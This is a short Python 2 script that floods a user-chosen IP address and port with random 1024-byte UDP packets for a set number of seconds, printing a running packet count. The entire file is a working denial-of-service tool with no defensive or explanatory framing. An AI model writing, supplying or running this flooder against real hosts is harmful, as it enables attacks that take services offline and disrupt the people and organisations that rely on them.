import socket
import random
import time
 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
bytes = random._urandom(1024)
 
ip = raw_input('IP address: ')
port = input('Port number: ')
duration = input('Number of seconds to send packets: ')
timeout = time.time() + duration
sent = 0;
 
while True:
    if time.time() > timeout:
        break
 
    else:
        pass
    sock.sendto(bytes,(ip,port))
    sent = sent + 1
    print "Sent %s packets to %s through port %s" %(sent,ip,port)